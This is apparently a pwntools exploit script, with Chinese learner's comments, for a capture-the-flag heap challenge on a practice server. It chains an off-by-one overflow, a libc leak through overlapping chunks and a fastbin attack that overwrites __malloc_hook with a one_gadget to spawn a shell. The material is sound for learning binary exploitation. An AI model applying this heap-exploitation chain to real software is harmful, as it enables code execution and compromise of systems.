# heap again
# 这题应该是off by one 类型
# 核心思路就是利用off by one来实现chunk的多重分配，这样我们就能够在free一个chunk之后，还保有指向该chunk的指针，就可以进行fd覆写的操作了。
'''
checksec:
    Arch:     amd64-64-little
    RELRO:    Full RELRO            不能改写got表
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''
from pwn import *
from LibcSearcher import *
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

p = remote('node4.buuoj.cn', 25544)
libc = ELF('../libcs/ubuntu16/x64/libc-2.23.so')

def cmd(command: int):
    p.recvuntil(b'choice: ')
    p.sendline(str(command).encode())

def create_note(size: int):
    cmd(1)
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())

def write_note(index: int, size: int, content: bytes):
    # assert(len(content)==size)
    cmd(2)
    p.recvuntil(b'Tell me the secret about you!!\nindex: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.sendlineafter(b'content: ', content)

def drop_note(index: int):
    cmd(3)
    p.sendlineafter(b'index: ', str(index).encode())

def show_note(index: int):
    cmd(4)
    p.sendlineafter(b'index: ', str(index).encode())

def exp():
    # 以下方法不是我自己想出来的，暂时还没找到这种套路的规律

    create_note(0x18) # id 0
    create_note(0x18) # id 1
    create_note(0x80) # id 2
    create_note(0x60) # id 3

    # leak libc addr
    payload1 = b'\x00'*0x18 + b'\xb1' # 这里的size一定要能够覆盖到下一个chunk，因为free的时候会检查下一个chunk的prev_inuse位是否为1。
    # print(payload1)
    write_note(0, 0x18+10, payload1)
    drop_note(1)
    # 注意程序使用的是calloc，所以我们需要重新写入下一个chunk的size 0x91
    create_note(0xa0) # id 1, memory size:0x80, overlap with id2
    payload2 = b'\x00'*0x18 + p64(0x91)
    write_note(1, 0x20, payload2)
    drop_note(2)
    show_note(1)
    main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x58 # wssb, 艹，这里一开始忘记写0x58了，我说怎么后面0x7f对不上
    # p.info(hex(main_arena))

    malloc_hook = main_arena - 0x10
    libc_base = malloc_hook - libc.sym['__malloc_hook']
    one_gadget = libc_base + 0x4526a

    # overlap
    create_note(0x60) # id 2
    create_note(0x10) # id 4
    payload2 = b'\x00'*0x18 + b'\x91'
    write_note(0, 0x18+10, payload2)
    drop_note(1)
    create_note(0x10) # id 1
    create_note(0x60) # id 5, point to the same address as id 2

    # fastbin attack
    drop_note(3)
    drop_note(5)
    payload3 = p64(malloc_hook-0x23)
    # print(hex(malloc_hook-0x23))
    write_note(2, 0x8, payload3) # overlap fd
    create_note(0x60) # id 3
    create_note(0x60) # id 5, fake chunk point to _malloc_hook
    # realloc满足one gadget条件
    payload4 = b'a'*(0x13-8) + p64(one_gadget) + p64(libc_base + libc.sym['__libc_realloc'] + 0x10)
    write_note(5, len(payload4), payload4)
    create_note(0x10)

    p.interactive()


if __name__ == '__main__':
    exp()